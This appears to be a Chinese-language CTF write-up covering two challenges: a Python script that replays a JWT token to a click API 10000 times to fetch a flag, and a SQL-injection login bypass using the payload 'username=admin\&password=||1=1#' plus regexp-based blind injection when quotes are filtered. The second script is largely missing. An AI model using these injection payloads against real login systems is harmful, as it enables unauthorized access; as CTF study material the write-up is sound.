可以通过题目给出的部分源代码以及自己的测试找到写脚本的思路，实际就是在 /api/click 去进行 POST 请求（也就是点击），每次点击都会更新 token ，利用 token 来保存点击次数，达到10000次后，转去 /api/getFlag 接口带着10000次的 token 去请求得到flag 。

脚本如下

import requestsimport json
url = "http://xxxxxxxxx/api/click"headers = {    "Content-Type": "application/json; charset=utf8"}token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjb3VudCI6MH0.qzSHx0Q4C5fwc7n2xZKB6K5uGdMRD93T7UqQ9nsaoYE"
for i in range(10005):    data = {        "token": token    }    r = requests.post(url, data=json.dumps(data), headers=headers)    if r.json()["sts"] != 200:        url = "http://xxxxxxxx/api/getFlag"        r = requests.get(url, data=json.dumps(data), headers=headers)        print(r.text)        break    token = r.json()["token"]    print(f"[*] {i} {token}")

•    过滤单双引号，如何bypass

•    利用 rlike 或者 regexp 进行模糊匹配，来SQL盲注

SQL注入语句在F12中给出

通过 username=admin\&password=||1=1# 可以成功登陆

这里 0 || 1 = 1 ，0 || 0 = 0 ，且当username输入 admin\ 时，username恒为0，所以可以通过控制 password 的输入运算返回值来进行盲注

脚本如下

a("6d")    #测出开头字符串,0x6d

每两位一组来利用前一位跑出下一位，最终跑出密码 mss2021ctf
